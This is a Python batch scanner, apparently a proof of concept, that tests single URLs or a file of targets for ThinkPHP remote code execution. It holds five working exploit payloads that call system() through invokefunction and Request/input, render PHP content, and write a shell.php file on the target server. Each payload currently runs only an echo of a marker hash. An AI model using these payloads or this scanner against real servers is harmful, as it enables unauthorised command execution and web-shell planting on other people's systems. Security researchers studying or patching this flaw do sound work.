# -*- coding=utf-8 -*-
# !/usr/bin/env python3

import gevent
import urllib.request
import sys
from gevent import monkey
monkey.patch_all()


def banner():
    print("""
                usage:
                        thinkPHPBatchPoc.py -f target.txt # 批量检测是否存在thinkPHP代码执行漏洞
                        thinkPHPBatchPoc.py -u target_URL # 指定检测是否存在thinkPHP代码执行漏洞
    """)


def runTask(url):
    # payload 发送
    try:
        response = urllib.request.urlopen(url)
        data = response.read()
        if "af1ac9e3090a4ecdce7b3fc0fdbd177883073e62cb3057cd7378006b" in str(data):
            print('%d bytes received from %s.' % (len(data), url))
            print("[+] is vulnerable [+]")
        else:
            print('%d bytes received from %s.' % (len(data), url))
            print("[+] not is vulnerable [+]")
    except Exception as e:
        print(e)
        pass


def urlOne(url):
    greenlets = [gevent.spawn(runTask, url+payload) for payload in payloads.values()]
    gevent.joinall(greenlets)


def urlMore(file):
    with open(file,"r") as f:
        urls = [url.strip("\n").strip("\r") for url in f.readlines()]
        for url in urls:
            greenlets = [gevent.spawn(runTask, url + payload) for payload in payloads.values()]
        gevent.joinall(greenlets)


if __name__ == '__main__':
    #payload
    payloads = {
        0: r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20af1ac9e3090a4ecdce7b3fc0fdbd177883073e62cb3057cd7378006b",
        1: r"/?s=index/\think\Request/input&filter=system&data=echo%20af1ac9e3090a4ecdce7b3fc0fdbd177883073e62cb3057cd7378006b",
        2: r"/?s=index/\think\view\driver\Php/display&content=%3C?php%20echo%20af1ac9e3090a4ecdce7b3fc0fdbd177883073e62cb3057cd7378006b;?%3E",
        3: r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20af1ac9e3090a4ecdce7b3fc0fdbd177883073e62cb3057cd7378006b",
        4: r"/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20echo%20\"af1ac9e3090a4ecdce7b3fc0fdbd177883073e62cb3057cd7378006b\";?%3E"
    }
    # 参数接受
    if len(sys.argv) != 3:
        banner()
        sys.exit(1)
    if sys.argv[1] == '-f':
        urlMore(sys.argv[2])
    elif sys.argv[1] == '-u':
        urlOne(sys.argv[2])

